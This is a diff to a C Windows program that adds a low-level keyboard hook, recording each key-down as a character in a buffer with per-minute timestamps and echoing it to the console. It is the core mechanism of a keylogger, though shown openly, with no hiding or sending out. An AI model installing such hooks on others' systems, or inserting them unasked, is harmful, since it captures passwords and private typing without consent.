@@ -10,7 +10,9 @@
     #define true 1
 #endif
 
-void renderMenu(); /* function prototype */
+/* prototypes */
+void renderMenu(); 
+LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 /* most people can't write over 1500 characters a minute */
 #define MESSAGE_BUFFER_SIZE 1500
 HHOOK keyboardHook;
@@ -22,6 +24,48 @@ struct Message {
     time_t messageTime;
     struct tm* timeinfo;
 };
+
+struct Message messages[MESSAGE_BUFFER_SIZE];
+
+/* The hook procedure */
+LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+
+    PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
+    DWORD lastKeyPressed = key->vkCode;
+
+    /* Intercepting the input msg */
+    if (wParam == WM_KEYDOWN && nCode == HC_ACTION) {
+        
+        static bool updateTime = true;
+        fflush(stdout);
+
+        if(updateTime) {
+            time(&messages[messageCount].messageTime);
+            messages[messageCount].timeinfo = localtime(&messages[messageCount].messageTime);
+
+            printf("\n\n<%02d:%02d> = ",
+                   messages[messageCount].timeinfo->tm_hour,
+                   messages[messageCount].timeinfo->tm_min);
+            updateTime = false;
+        }
+
+        messages[messageCount].message[keyCount] = (char)lastKeyPressed;
+        printf("%c", messages[messageCount].message[keyCount]);
+        
+        
+        time_t timeOfKey = time(&timeOfKey);
+        struct tm* timeOfKeyInfo = localtime(&timeOfKey);
+
+        if(timeOfKeyInfo->tm_min != messages[messageCount].timeinfo->tm_min) {
+            puts("THE TIME JUST CHANGED\n");
+            messageCount++;
+            updateTime = true;
+        }
+        keyCount++;
+        
+    }
+    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
+}
 
 void clear() {
     system("cls");
